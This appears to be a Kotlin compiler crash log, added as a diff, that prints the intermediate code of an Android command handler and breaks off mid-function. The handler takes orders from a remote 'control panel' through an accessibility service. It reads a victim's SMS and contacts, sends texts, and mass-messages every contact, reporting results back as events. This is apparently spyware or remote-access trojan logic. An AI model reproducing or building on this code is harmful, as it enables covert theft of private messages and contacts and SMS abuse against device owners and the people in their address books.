@@ -1,0 +1,835 @@
+kotlin version: 2.1.0
+error message: org.jetbrains.kotlin.backend.common.BackendException: Backend Internal error: Exception during IR lowering
+File being compiled: /home/code/php/project/full-package/update-replica/app/src/main/java/com/storm/safe/rock/service/modules/command/SmsContactsCommandHandler.kt
+The root cause org.jetbrains.kotlin.backend.common.CompilationException was thrown at: org.jetbrains.kotlin.ir.expressions.impl.BuildersKt.IrGetValueImpl(builders.kt:401)
+	at org.jetbrains.kotlin.backend.common.CodegenUtil.reportBackendException(CodegenUtil.kt:253)
+	at org.jetbrains.kotlin.backend.common.CodegenUtil.reportBackendException$default(CodegenUtil.kt:236)
+	at org.jetbrains.kotlin.backend.common.phaser.PerformByIrFilePhase.invokeSequential(performByIrFile.kt:55)
+	at org.jetbrains.kotlin.backend.common.phaser.PerformByIrFilePhase.invoke(performByIrFile.kt:42)
+	at org.jetbrains.kotlin.backend.common.phaser.PerformByIrFilePhase.invoke(performByIrFile.kt:28)
+	at org.jetbrains.kotlin.backend.common.phaser.NamedCompilerPhase.phaseBody(CompilerPhase.kt:166)
+	at org.jetbrains.kotlin.backend.common.phaser.AbstractNamedCompilerPhase.invoke(CompilerPhase.kt:113)
+	at org.jetbrains.kotlin.backend.common.phaser.CompositePhase.invoke(PhaseBuilders.kt:27)
+	at org.jetbrains.kotlin.backend.common.phaser.CompositePhase.invoke(PhaseBuilders.kt:14)
+	at org.jetbrains.kotlin.backend.common.phaser.NamedCompilerPhase.phaseBody(CompilerPhase.kt:166)
+	at org.jetbrains.kotlin.backend.common.phaser.AbstractNamedCompilerPhase.invoke(CompilerPhase.kt:113)
+	at org.jetbrains.kotlin.backend.common.phaser.CompilerPhaseKt.invokeToplevel(CompilerPhase.kt:62)
+	at org.jetbrains.kotlin.backend.jvm.JvmIrCodegenFactory.invokeLowerings(JvmIrCodegenFactory.kt:358)
+	at org.jetbrains.kotlin.codegen.CodegenFactory.generateModule(CodegenFactory.kt:46)
+	at org.jetbrains.kotlin.backend.jvm.JvmIrCodegenFactory.generateModuleInFrontendIRMode(JvmIrCodegenFactory.kt:433)
+	at org.jetbrains.kotlin.cli.jvm.compiler.pipeline.JvmCompilerPipelineKt.generateCodeFromIr(jvmCompilerPipeline.kt:192)
+	at org.jetbrains.kotlin.cli.jvm.compiler.pipeline.JvmCompilerPipelineKt.runBackend(jvmCompilerPipeline.kt:80)
+	at org.jetbrains.kotlin.cli.jvm.compiler.pipeline.JvmCompilerPipelineLightTreeKt.compileModule(jvmCompilerPipelineLightTree.kt:264)
+	at org.jetbrains.kotlin.cli.jvm.compiler.pipeline.JvmCompilerPipelineLightTreeKt.compileSingleModuleUsingFrontendIrAndLightTree(jvmCompilerPipelineLightTree.kt:231)
+	at org.jetbrains.kotlin.cli.jvm.compiler.pipeline.JvmCompilerPipelineLightTreeKt.compileModulesUsingFrontendIrAndLightTree(jvmCompilerPipelineLightTree.kt:86)
+	at org.jetbrains.kotlin.cli.jvm.K2JVMCompiler.doExecute(K2JVMCompiler.kt:146)
+	at org.jetbrains.kotlin.cli.jvm.K2JVMCompiler.doExecute(K2JVMCompiler.kt:43)
+	at org.jetbrains.kotlin.cli.common.CLICompiler.execImpl(CLICompiler.kt:102)
+	at org.jetbrains.kotlin.cli.common.CLICompiler.exec(CLICompiler.kt:316)
+	at org.jetbrains.kotlin.incremental.IncrementalJvmCompilerRunner.runCompiler(IncrementalJvmCompilerRunner.kt:464)
+	at org.jetbrains.kotlin.incremental.IncrementalJvmCompilerRunner.runCompiler(IncrementalJvmCompilerRunner.kt:73)
+	at org.jetbrains.kotlin.incremental.IncrementalCompilerRunner.doCompile(IncrementalCompilerRunner.kt:506)
+	at org.jetbrains.kotlin.incremental.IncrementalCompilerRunner.compileImpl(IncrementalCompilerRunner.kt:423)
+	at org.jetbrains.kotlin.incremental.IncrementalCompilerRunner.compileNonIncrementally(IncrementalCompilerRunner.kt:301)
+	at org.jetbrains.kotlin.incremental.IncrementalCompilerRunner.compile(IncrementalCompilerRunner.kt:129)
+	at org.jetbrains.kotlin.daemon.CompileServiceImplBase.execIncrementalCompiler(CompileServiceImpl.kt:674)
+	at org.jetbrains.kotlin.daemon.CompileServiceImplBase.access$execIncrementalCompiler(CompileServiceImpl.kt:91)
+	at org.jetbrains.kotlin.daemon.CompileServiceImpl.compile(CompileServiceImpl.kt:1659)
+	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
+	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.base/java.lang.reflect.Method.invoke(Method.java:569)
+	at java.rmi/sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:360)
+	at java.rmi/sun.rmi.transport.Transport$1.run(Transport.java:200)
+	at java.rmi/sun.rmi.transport.Transport$1.run(Transport.java:197)
+	at java.base/java.security.AccessController.doPrivileged(AccessController.java:712)
+	at java.rmi/sun.rmi.transport.Transport.serviceCall(Transport.java:196)
+	at java.rmi/sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:587)
+	at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:828)
+	at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:705)
+	at java.base/java.security.AccessController.doPrivileged(AccessController.java:399)
+	at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:704)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
+	at java.base/java.lang.Thread.run(Thread.java:840)
+Caused by: org.jetbrains.kotlin.backend.common.CompilationException: Back-end: Please report this problem https://kotl.in/issue
+/home/code/php/project/full-package/update-replica/app/src/main/java/com/storm/safe/rock/service/modules/command/SmsContactsCommandHandler.kt:20:1
+Problem with `class SmsContactsCommandHandler : CommandHandler {
+  constructor() /* primary */ {
+    super/*Any*/()
+    /* <init>() */
+
+  }
+
+  companion object Companion {
+    private constructor() /* primary */ {
+      super/*Any*/()
+      /* <init>() */
+
+    }
+
+    /* fake */ override operator fun equals(other: Any?): Boolean
+
+    /* fake */ override fun hashCode(): Int
+
+    /* fake */ override fun toString(): String
+
+  }
+
+  override fun getSupportedCommands(): Set<String> {
+    return setOf<String>(elements = { // BLOCK
+      val tmp0: Array<out String> = arrayOfNulls<String>(size = 8)
+      tmp0.set(index = 0, value = "SMS_READ")
+      tmp0.set(index = 1, value = "SMS_SEND")
+      tmp0.set(index = 2, value = "SMS_SEND_ALL_CONTACTS")
+      tmp0.set(index = 3, value = "SMS_GET_DUAL_SIM_STATUS")
+      tmp0.set(index = 4, value = "CONTACTS_READ")
+      tmp0.set(index = 5, value = "GET_CONTACTS")
+      tmp0.set(index = 6, value = "CONTACTS_SEARCH")
+      tmp0.set(index = 7, value = "CONTACTS_STATS")
+      tmp0
+    })
+  }
+
+  override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
+    { // BLOCK
+      val tmp0_subject: String = command
+      when {
+        EQEQ(arg0 = tmp0_subject, arg1 = "SMS_READ") -> <this>.handleSmsRead(params = params, context = context)
+        EQEQ(arg0 = tmp0_subject, arg1 = "SMS_SEND") -> <this>.handleSmsSend(params = params, context = context)
+        EQEQ(arg0 = tmp0_subject, arg1 = "SMS_SEND_ALL_CONTACTS") -> <this>.handleSmsSendAllContacts(params = params, context = context)
+        EQEQ(arg0 = tmp0_subject, arg1 = "SMS_GET_DUAL_SIM_STATUS") -> <this>.handleGetDualSimStatus(context = context)
+        EQEQ(arg0 = tmp0_subject, arg1 = "CONTACTS_READ") -> <this>.handleContactsRead(params = params, context = context)
+        EQEQ(arg0 = tmp0_subject, arg1 = "GET_CONTACTS") -> <this>.handleContactsRead(params = params, context = context)
+        EQEQ(arg0 = tmp0_subject, arg1 = "CONTACTS_SEARCH") -> <this>.handleContactsSearch(params = params, context = context)
+        EQEQ(arg0 = tmp0_subject, arg1 = "CONTACTS_STATS") -> <this>.handleContactsStats(context = context)
+      }
+    }
+  }
+
+  private fun handleSmsRead(params: JSONObject?, context: CommandContext) {
+    val limit: Int = { // BLOCK
+      val tmp1_elvis_lhs: Int? = { // BLOCK
+        val tmp0_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp0_safe_receiver, arg1 = null) -> null
+          else -> tmp0_safe_receiver.optInt(p0 = "limit", p1 = 100)
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp1_elvis_lhs, arg1 = null) -> 100
+        else -> tmp1_elvis_lhs
+      }
+    }
+    d(p0 = "SmsContactsCmdHandler", p1 = "[控制面板] 读取短信列表，限制: " + limit + " 条") /*~> Unit */
+    val service: MyAccessibilityService? = context.<get-service>()
+    val smsModule: SmsInterceptDelegate? = { // BLOCK
+      val tmp2_safe_receiver: MyAccessibilityService? = service
+      when {
+        EQEQ(arg0 = tmp2_safe_receiver, arg1 = null) -> null
+        else -> tmp2_safe_receiver.<get-smsInterceptDelegate>()
+      }
+    }
+    val hasPermission: Boolean = when {
+      EQEQ(arg0 = smsModule, arg1 = null).not() -> EQEQ(arg0 = { // BLOCK
+        val tmp3_safe_receiver: MyAccessibilityService? = service
+        when {
+          EQEQ(arg0 = tmp3_safe_receiver, arg1 = null) -> null
+          else -> tmp3_safe_receiver.checkSelfPermission(p0 = "android.permission.READ_SMS")
+        }
+      }, arg1 = 0)
+      else -> false
+    }
+    d(p0 = "SmsContactsCmdHandler", p1 = "短信读取权限: " + hasPermission) /*~> Unit */
+    when {
+      when {
+        hasPermission -> EQEQ(arg0 = service, arg1 = null).not()
+        else -> false
+      } -> { // BLOCK
+        try { // BLOCK
+          val smsList: JSONArray = CHECK_NOT_NULL<SmsInterceptDelegate>(arg0 = smsModule).readSms(limit = limit)
+          d(p0 = "SmsContactsCmdHandler", p1 = "读取到 " + smsList.length() + " 条短信") /*~> Unit */
+          val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+            // COMPOSITE {
+            // }
+            SmsContactsCommandHandler::handleSmsRead$lambda$0/*($smsList = smsList)*/
+          })
+          context.sendEvent(eventType = "sms_list_response", data = data)
+          when {
+            greater(arg0 = smsList.length(), arg1 = 0) -> { // BLOCK
+              d(p0 = "SmsContactsCmdHandler", p1 = "触发增量同步") /*~> Unit */
+              smsModule.updateSyncTimestamp(smsList = smsList)
+            }
+          }
+        }
+        catch (e: Exception){ // BLOCK
+          e(p0 = "SmsContactsCmdHandler", p1 = "读取短信失败", p2 = e) /*~> Unit */
+          val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+            // COMPOSITE {
+            // }
+            SmsContactsCommandHandler::handleSmsRead$lambda$1/*($e = e)*/
+          })
+          context.sendEvent(eventType = "sms_list_response", data = data)
+        }
+
+      }
+      else -> { // BLOCK
+        w(p0 = "SmsContactsCmdHandler", p1 = "没有短信读取权限，弹出权限请求") /*~> Unit */
+        val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+          // COMPOSITE {
+          // }
+          SmsContactsCommandHandler::handleSmsRead$lambda$2
+        })
+        context.sendEvent(eventType = "sms_list_response", data = data)
+      }
+    }
+  }
+
+  private fun handleSmsSend(params: JSONObject?, context: CommandContext) {
+    val phoneNumber: String = { // BLOCK
+      val tmp1_elvis_lhs: @FlexibleNullability String? = { // BLOCK
+        val tmp0_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp0_safe_receiver, arg1 = null) -> null
+          else -> tmp0_safe_receiver.optString(p0 = "phoneNumber", p1 = "")
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp1_elvis_lhs, arg1 = null) -> ""
+        else -> tmp1_elvis_lhs
+      }
+    }
+    val message: String = { // BLOCK
+      val tmp3_elvis_lhs: @FlexibleNullability String? = { // BLOCK
+        val tmp2_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp2_safe_receiver, arg1 = null) -> null
+          else -> tmp2_safe_receiver.optString(p0 = "message", p1 = "")
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp3_elvis_lhs, arg1 = null) -> ""
+        else -> tmp3_elvis_lhs
+      }
+    }
+    val simSlot: Int = { // BLOCK
+      val tmp5_elvis_lhs: Int? = { // BLOCK
+        val tmp4_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp4_safe_receiver, arg1 = null) -> null
+          else -> tmp4_safe_receiver.optInt(p0 = "simSlot", p1 = 0)
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp5_elvis_lhs, arg1 = null) -> 0
+        else -> tmp5_elvis_lhs
+      }
+    }
+    d(p0 = "SmsContactsCmdHandler", p1 = "发送短信到 " + phoneNumber + " (卡" + simSlot.plus(other = 1) + ")") /*~> Unit */
+    try { // BLOCK
+      val service: MyAccessibilityService = { // BLOCK
+        val tmp6_elvis_lhs: MyAccessibilityService? = context.<get-service>()
+        when {
+          EQEQ(arg0 = tmp6_elvis_lhs, arg1 = null) -> return #INSTANCE
+          else -> tmp6_elvis_lhs
+        }
+      }
+      val smsModule: SmsInterceptDelegate? = service.<get-smsInterceptDelegate>()
+      val success: Boolean = { // BLOCK
+        val tmp8_elvis_lhs: Boolean? = { // BLOCK
+          val tmp7_safe_receiver: SmsInterceptDelegate? = smsModule
+          when {
+            EQEQ(arg0 = tmp7_safe_receiver, arg1 = null) -> null
+            else -> tmp7_safe_receiver.sendSms(phoneNumber = phoneNumber, simSlot = simSlot, message = message)
+          }
+        }
+        when {
+          EQEQ(arg0 = tmp8_elvis_lhs, arg1 = null) -> false
+          else -> tmp8_elvis_lhs
+        }
+      }
+      d(p0 = "SmsContactsCmdHandler", p1 = when {
+        success -> "短信发送成功"
+        else -> "短信发送失败"
+      }) /*~> Unit */
+      val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+        // COMPOSITE {
+        // }
+        SmsContactsCommandHandler::handleSmsSend$lambda$3/*($success = success, $phoneNumber = phoneNumber, $simSlot = simSlot)*/
+      })
+      context.sendEvent(eventType = "sms_send_response", data = data)
+    }
+    catch (e: Exception){ // BLOCK
+      e(p0 = "SmsContactsCmdHandler", p1 = "发送短信失败", p2 = e)
+    }
+ /*~> Unit */
+  }
+
+  private fun handleSmsSendAllContacts(params: JSONObject?, context: CommandContext) {
+    val message: String = { // BLOCK
+      val tmp1_elvis_lhs: @FlexibleNullability String? = { // BLOCK
+        val tmp0_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp0_safe_receiver, arg1 = null) -> null
+          else -> tmp0_safe_receiver.optString(p0 = "message", p1 = "")
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp1_elvis_lhs, arg1 = null) -> ""
+        else -> tmp1_elvis_lhs
+      }
+    }
+    val simSlot: Int = { // BLOCK
+      val tmp3_elvis_lhs: Int? = { // BLOCK
+        val tmp2_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp2_safe_receiver, arg1 = null) -> null
+          else -> tmp2_safe_receiver.optInt(p0 = "simSlot", p1 = 0)
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp3_elvis_lhs, arg1 = null) -> 0
+        else -> tmp3_elvis_lhs
+      }
+    }
+    d(p0 = "SmsContactsCmdHandler", p1 = "群发通讯录所有联系人 (卡" + simSlot.plus(other = 1) + ")") /*~> Unit */
+    val count: IntRef = IntRef()
+    try { // BLOCK
+      val service: MyAccessibilityService = { // BLOCK
+        val tmp4_elvis_lhs: MyAccessibilityService? = context.<get-service>()
+        when {
+          EQEQ(arg0 = tmp4_elvis_lhs, arg1 = null) -> return #INSTANCE
+          else -> tmp4_elvis_lhs
+        }
+      }
+      val smsModule: SmsInterceptDelegate? = service.<get-smsInterceptDelegate>()
+      count.#element = { // BLOCK
+        val tmp6_elvis_lhs: Int? = { // BLOCK
+          val tmp5_safe_receiver: SmsInterceptDelegate? = smsModule
+          when {
+            EQEQ(arg0 = tmp5_safe_receiver, arg1 = null) -> null
+            else -> tmp5_safe_receiver.broadcastSmsToContacts(simSlot = simSlot, message = message)
+          }
+        }
+        when {
+          EQEQ(arg0 = tmp6_elvis_lhs, arg1 = null) -> 0
+          else -> tmp6_elvis_lhs
+        }
+      }
+      d(p0 = "SmsContactsCmdHandler", p1 = "群发完成: 成功 " + count.#element + " 条") /*~> Unit */
+      val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+        // COMPOSITE {
+        // }
+        SmsContactsCommandHandler::handleSmsSendAllContacts$lambda$4/*($count = count, $simSlot = simSlot)*/
+      })
+      context.sendEvent(eventType = "sms_send_all_response", data = data)
+    }
+    catch (e: Exception){ // BLOCK
+      e(p0 = "SmsContactsCmdHandler", p1 = "群发短信失败", p2 = e)
+    }
+ /*~> Unit */
+  }
+
+  private fun handleGetDualSimStatus(context: CommandContext) {
+    d(p0 = "SmsContactsCmdHandler", p1 = "获取双卡状态") /*~> Unit */
+    try { // BLOCK
+      val service: MyAccessibilityService = { // BLOCK
+        val tmp0_elvis_lhs: MyAccessibilityService? = context.<get-service>()
+        when {
+          EQEQ(arg0 = tmp0_elvis_lhs, arg1 = null) -> return #INSTANCE
+          else -> tmp0_elvis_lhs
+        }
+      }
+      val smsModule: SmsInterceptDelegate? = service.<get-smsInterceptDelegate>()
+      val isDualSim: BooleanRef = BooleanRef()
+      when {
+        EQEQ(arg0 = smsModule, arg1 = null).not() -> { // BLOCK
+          when {
+            EQEQ(arg0 = service.checkSelfPermission(p0 = "android.permission.READ_PHONE_STATE"), arg1 = 0) -> { // BLOCK
+              val subManager: SubscriptionManager = service.getSystemService(p0 = "telephony_subscription_service") as SubscriptionManager
+              when {
+                greater(arg0 = subManager.getActiveSubscriptionInfoCount(), arg1 = 1) -> { // BLOCK
+                  isDualSim.#element = true
+                }
+              }
+            }
+          }
+        }
+      }
+      d(p0 = "SmsContactsCmdHandler", p1 = "双卡状态: " + isDualSim.#element) /*~> Unit */
+      val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+        // COMPOSITE {
+        // }
+        SmsContactsCommandHandler::handleGetDualSimStatus$lambda$5/*($isDualSim = isDualSim)*/
+      })
+      context.sendEvent(eventType = "dual_sim_status", data = data)
+    }
+    catch (e: Exception){ // BLOCK
+      e(p0 = "SmsContactsCmdHandler", p1 = "获取双卡状态失败", p2 = e)
+    }
+ /*~> Unit */
+  }
+
+  private suspend fun handleContactsRead(params: JSONObject?, context: CommandContext) {
+    val limit: Int = { // BLOCK
+      val tmp1_elvis_lhs: Int? = { // BLOCK
+        val tmp0_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp0_safe_receiver, arg1 = null) -> null
+          else -> tmp0_safe_receiver.optInt(p0 = "limit", p1 = 500)
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp1_elvis_lhs, arg1 = null) -> 500
+        else -> tmp1_elvis_lhs
+      }
+    }
+    d(p0 = "SmsContactsCmdHandler", p1 = "收到读取通讯录命令，限制: " + limit + " 条") /*~> Unit */
+    val service: MyAccessibilityService? = context.<get-service>()
+    val hasPermission: Boolean = when {
+      EQEQ(arg0 = service, arg1 = null).not() -> EQEQ(arg0 = service.checkSelfPermission(p0 = "android.permission.READ_CONTACTS"), arg1 = 0)
+      else -> false
+    }
+    d(p0 = "SmsContactsCmdHandler", p1 = "通讯录读取权限状态: " + hasPermission) /*~> Unit */
+    when {
+      when {
+        hasPermission -> EQEQ(arg0 = service, arg1 = null).not()
+        else -> false
+      } -> { // BLOCK
+        d(p0 = "SmsContactsCmdHandler", p1 = "权限已授予，开始读取通讯录") /*~> Unit */
+        withContext<Unit>(context = <get-IO>(), block = { // BLOCK
+          package class <no name provided> : SuspendLambda, Function2<CoroutineScope, Continuation<Unit>?, Any?> {
+            package var label: Int
+            local constructor($completion: Continuation<<no name provided>>?) /* primary */ {
+              super/*SuspendLambda*/(arity = 2, $completion = $completion)
+              /* <init>() */
+
+            }
+
+            override fun invokeSuspend($result: Result<Any?>): Any? {
+              try { // BLOCK
+                val contacts: JSONArray = <this>.readContactsViaContentResolver(service = service, limit = limit)
+                val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+                  local fun JSONObject.<anonymous>() {
+                    $this$apply.put(p0 = "success", p1 = true) /*~> Unit */
+                    $this$apply.put(p0 = "count", p1 = contacts.length()) /*~> Unit */
+                    $this$apply.put(p0 = "contacts", p1 = contacts) /*~> Unit */
+                  }
+
+                  <no name provided>::<anonymous>
+                })
+                context.sendEvent(eventType = "contacts_response", data = data)
+              }
+              catch (e: Exception){ // BLOCK
+                e(p0 = "SmsContactsCmdHandler", p1 = "读取通讯录失败", p2 = e)
+              }
+ /*~> Unit */
+              #INSTANCE
+            }
+
+            override fun create(value: Any?, $completion: Continuation<Nothing>): Continuation<Unit> {
+              return <no name provided>($completion = $completion)
+            }
+
+            override fun invoke(p1: CoroutineScope, p2: Continuation<Unit>?): Any? {
+              return <this>.create(value = p1, $completion = p2) /*as <no name provided> */.invokeSuspend($result = <unsafe-coerce><Any?, Result<Any?>>(v = #INSTANCE))
+            }
+
+          }
+
+          <no name provided>($completion = null)
+        })
+      }
+      else -> { // BLOCK
+        w(p0 = "SmsContactsCmdHandler", p1 = "没有通讯录读取权限") /*~> Unit */
+        val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+          local fun JSONObject.<anonymous>() {
+            $this$apply.put(p0 = "success", p1 = false) /*~> Unit */
+            $this$apply.put(p0 = "error", p1 = "正在请求通讯录权限，请在弹出的对话框中授权后重试") /*~> Unit */
+            $this$apply.put(p0 = "needPermission", p1 = true) /*~> Unit */
+            $this$apply.put(p0 = "count", p1 = 0) /*~> Unit */
+            $this$apply.put(p0 = "contacts", p1 = JSONArray()) /*~> Unit */
+          }
+
+          SmsContactsCommandHandler::<anonymous>
+        })
+        context.sendEvent(eventType = "contacts_response", data = data)
+      }
+    }
+  }
+
+  private fun readContactsViaContentResolver(service: Context, limit: Int): JSONArray {
+    val contacts: JSONArray = JSONArray()
+    try { // BLOCK
+      val cursor: Cursor? = service.getContentResolver().query(p0 = super<Phone>.#CONTENT_URI, p1 = { // BLOCK
+        val tmp0: Array<out String> = arrayOfNulls<String>(size = 3)
+        tmp0.set(index = 0, value = "display_name")
+        tmp0.set(index = 1, value = "data1")
+        tmp0.set(index = 2, value = "contact_id")
+        tmp0
+      }, p2 = null, p3 = null, p4 = "display_name ASC")
+      { // BLOCK
+        val tmp0_safe_receiver: Cursor? = cursor
+        when {
+          EQEQ(arg0 = tmp0_safe_receiver, arg1 = null) -> null
+          else -> tmp0_safe_receiver.use<Cursor, Unit>(block = { // BLOCK
+            local fun <anonymous>(it: Cursor) {
+              var count: Int = 0
+              while (when {
+                it.moveToNext() -> less(arg0 = count, arg1 = limit)
+                else -> false
+              }) { // BLOCK
+                val name: String = { // BLOCK
+                  val tmp0_elvis_lhs: @FlexibleNullability String? = it.getString(p0 = 0)
+                  when {
+                    EQEQ(arg0 = tmp0_elvis_lhs, arg1 = null) -> ""
+                    else -> tmp0_elvis_lhs
+                  }
+                }
+                val phone: String = { // BLOCK
+                  val tmp1_elvis_lhs: @FlexibleNullability String? = it.getString(p0 = 1)
+                  when {
+                    EQEQ(arg0 = tmp1_elvis_lhs, arg1 = null) -> ""
+                    else -> tmp1_elvis_lhs
+                  }
+                }
+                val id: Long = it.getLong(p0 = 2)
+                contacts.put(p0 = JSONObject().apply<JSONObject>(block = { // BLOCK
+                  local fun JSONObject.<anonymous>() {
+                    $this$apply.put(p0 = "id", p1 = id) /*~> Unit */
+                    $this$apply.put(p0 = "name", p1 = name) /*~> Unit */
+                    $this$apply.put(p0 = "phone", p1 = phone) /*~> Unit */
+                  }
+
+                  SmsContactsCommandHandler::<anonymous>
+                })) /*~> Unit */
+                { // BLOCK
+                  val <unary>: Int = count
+                  count = <unary>.inc()
+                  <unary>
+                } /*~> Unit */
+              }
+            }
+
+            SmsContactsCommandHandler::<anonymous>
+          })
+        }
+      }
+    }
+    catch (e: Exception){ // BLOCK
+      e(p0 = "SmsContactsCmdHandler", p1 = "readContactsViaContentResolver failed", p2 = e)
+    }
+ /*~> Unit */
+    return contacts
+  }
+
+  private fun handleContactsSearch(params: JSONObject?, context: CommandContext) {
+    val keyword: String = { // BLOCK
+      val tmp1_elvis_lhs: @FlexibleNullability String? = { // BLOCK
+        val tmp0_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp0_safe_receiver, arg1 = null) -> null
+          else -> tmp0_safe_receiver.optString(p0 = "keyword", p1 = "")
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp1_elvis_lhs, arg1 = null) -> ""
+        else -> tmp1_elvis_lhs
+      }
+    }
+    val limit: Int = { // BLOCK
+      val tmp3_elvis_lhs: Int? = { // BLOCK
+        val tmp2_safe_receiver: JSONObject? = params
+        when {
+          EQEQ(arg0 = tmp2_safe_receiver, arg1 = null) -> null
+          else -> tmp2_safe_receiver.optInt(p0 = "limit", p1 = 50)
+        }
+      }
+      when {
+        EQEQ(arg0 = tmp3_elvis_lhs, arg1 = null) -> 50
+        else -> tmp3_elvis_lhs
+      }
+    }
+    d(p0 = "SmsContactsCmdHandler", p1 = "搜索联系人: " + keyword) /*~> Unit */
+    val service: MyAccessibilityService = { // BLOCK
+      val tmp4_elvis_lhs: MyAccessibilityService? = context.<get-service>()
+      when {
+        EQEQ(arg0 = tmp4_elvis_lhs, arg1 = null) -> return #INSTANCE
+        else -> tmp4_elvis_lhs
+      }
+    }
+    val hasPermission: Boolean = EQEQ(arg0 = service.checkSelfPermission(p0 = "android.permission.READ_CONTACTS"), arg1 = 0)
+    when {
+      hasPermission -> { // BLOCK
+        try { // BLOCK
+          val contacts: JSONArray = <this>.searchContactsViaContentResolver(service = service, limit = limit, keyword = keyword)
+          val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+            local fun JSONObject.<anonymous>() {
+              $this$apply.put(p0 = "success", p1 = true) /*~> Unit */
+              $this$apply.put(p0 = "keyword", p1 = keyword) /*~> Unit */
+              $this$apply.put(p0 = "count", p1 = contacts.length()) /*~> Unit */
+              $this$apply.put(p0 = "contacts", p1 = contacts) /*~> Unit */
+            }
+
+            SmsContactsCommandHandler::<anonymous>
+          })
+          context.sendEvent(eventType = "contacts_search_response", data = data)
+        }
+        catch (e: Exception){ // BLOCK
+          e(p0 = "SmsContactsCmdHandler", p1 = "搜索联系人失败", p2 = e)
+        }
+
+      }
+      else -> { // BLOCK
+        val data: JSONObject = JSONObject().apply<JSONObject>(block = { // BLOCK
+          local fun JSONObject.<anonymous>() {
+            $this$apply.put(p0 = "success", p1 = false) /*~> Unit */
+            $this$apply.put(p0 = "error", p1 = "没有通讯录读取权限") /*~> Unit */
+          }
+
+          SmsContactsCommandHandler::<anonymous>
+        })
+        context.sendEvent(eventType = "contacts_search_response", data = data)
+      }
+    } /*~> Unit */
+  }
+
+  private fun searchContactsViaContentResolver(service: Context, limit: Int, keyword: String): JSONArray {
+    val contacts: JSONArray = JSONArray()
+    try { // BLOCK
+      val selection: String = "display_name LIKE ?"
+      val selectionArgs: Array<String> = { // BLOCK
+        val tmp0: Array<out String> = arrayOfNulls<String>(size = 1)
+        tmp0.set(index = 0, value = "%" + keyword + "%")
+        tmp0
+      }
+      val cursor: Cursor? = service.getContentResolver().query(p0 = super<Phone>.#CONTENT_URI, p1 = { // BLOCK
+        val tmp0: Array<out String> = arrayOfNulls<String>(size = 3)
+        tmp0.set(index = 0, value = "display_name")
+        tmp0.set(index = 1, value = "data1")
+        tmp0.set(index = 2, value = "contact_id")
+        tmp0
+      }, p2 = selection, p3 = selectionArgs, p4 = "display_name ASC")
+      { // BLOCK
+        val tmp0_safe_receiver: Cursor? = cursor
+        when {
+          EQEQ(arg0 = tmp0_safe_receiver, arg1 = null) -> null
+          else -> tmp0_safe_receiver.use<Cursor, Unit>(block = { // BLOCK
+            local fun <anonymous>(it: Cursor) {
+              var count: Int = 0
+              while (when {
+                it.moveToNext() -> less(arg0 = count, arg1 = limit)
+                else -> false
+              }) { // BLOCK
+                val name: String = { // BLOCK
+                  val tmp0_elvis_lhs: @FlexibleNullability String? = it.getString(p0 = 0)
+                  when {
+                    EQEQ(arg0 = tmp0_elvis_lhs, arg1 = null) -> ""
+                    else -> tmp0_elvis_lhs
+                  }
+                }
+                val phone: String = { // BLOCK
+                  val tmp1_elvis_lhs: @FlexibleNullability String? = it.getString(p0 = 1)
+                  when {
+                    EQEQ(arg0 = tmp1_elvis_lhs, arg1 = null) -> ""
+                    else -> tmp1_elvis_lhs
+                  }
+                }
+                val id: Long = it.getLong(p0 = 2)
+                contacts.put(p0 = JSONObject().apply<JSONObject>(block = { // BLOCK
+                  local fun JSONObject.<anonymous>() {
+                    $this$apply.put(p0 = "id", p1 = id) /*~> Unit */
+                    $this$apply.put(p0 = "name", p1 = name) /*~> Unit */
+                    $this$apply.put(p0 = "phone", p1 = phone) /*~> Unit */
+                  }
+
+                  SmsContactsCommandHandler::<anonymous>
+                })) /*~> Unit */
+                { // BLOCK
+                  val <unary>: Int = count
+                  count = <unary>.inc()
+                  <unary>
+                } /*~> Unit */
+              }
+            }
+
+            SmsContactsCommandHandler::<anonymous>
+          })
+        }
+      }
+    }
+    catch (e: Exception){ // BLOCK
+      e(p0 = "SmsContactsCmdHandler", p1 = "searchContactsViaContentResolver failed", p2 = e)
+    }
+ /*~> Unit */
+    return contacts
+  }
+
+  private fun handleContactsStats(context: CommandContext) {
